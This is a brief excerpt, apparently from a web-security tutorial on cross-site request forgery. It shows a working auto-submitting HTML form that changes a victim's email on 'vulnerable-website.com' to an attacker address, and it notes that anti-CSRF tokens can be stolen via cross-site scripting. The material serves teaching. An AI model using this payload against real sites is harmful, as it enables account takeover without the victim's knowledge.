...
<body>
 <form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body>
 </html>`
```
...
Anti-CSRF tokens can be stolen using CrossSite Scripting and later used to launch a succesful CSRF attack.